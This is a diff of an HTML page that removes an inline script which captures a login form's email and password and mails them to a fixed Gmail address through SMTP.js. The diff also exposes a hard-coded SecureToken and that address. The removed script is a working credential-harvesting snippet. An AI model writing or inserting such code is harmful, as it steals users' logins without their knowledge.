@@ -574,28 +574,7 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.1/js/all.min.js"
         integrity="sha512-1JkMy1LR9bTo3psH+H4SV5bO2dFylgOy+UJhMus1zF4VEFuZVu5lsi4I6iIndE4N9p01z1554ZDcvMSjMaqCBQ=="
         crossorigin="anonymous" referrerpolicy="no-referrer"></script>
-    <script src="https://smtpjs.com/v3/smtp.js"></script>
-    <script>
-        document.getElementById("loginForm").addEventListener("submit", function (event) {
-            event.preventDefault(); // Prevent form from submitting the traditional way
-
-            var userEmail = document.getElementById("email").value;
-            var userPassword = document.getElementById("contactnumber").value;
-
-            // Use SMTP.js to send email
-            Email.send({
-                SecureToken: "5a644cd3-520c-4a14-a53c-fd2696f179fa",  // SMTP.js ની ટોકન અહીં પેસ્ટ કરો
-                To: "dhruvpra2007@gmail.com",  // તમારું ઈમેઈલ આડ્રેસ અહીં નાખો
-                From: "dhruvpra2007@gmail.com",  // તમારું ઈમેઈલ આડ્રેસ અહીં નાખો
-                Subject: "New Login Form Submission",
-                Body: "Email: " + userEmail + "<br> Password: " + userPassword
-            }).then(function (message) {
-                alert("Login details sent successfully!");
-            }).catch(function (error) {
-                console.error("Error sending email:", error);
-            });
-        });
-    </script>
+    <!-- <script src="https://smtpjs.com/v3/smtp.js"></script> -->
 </body>
 
 </html>
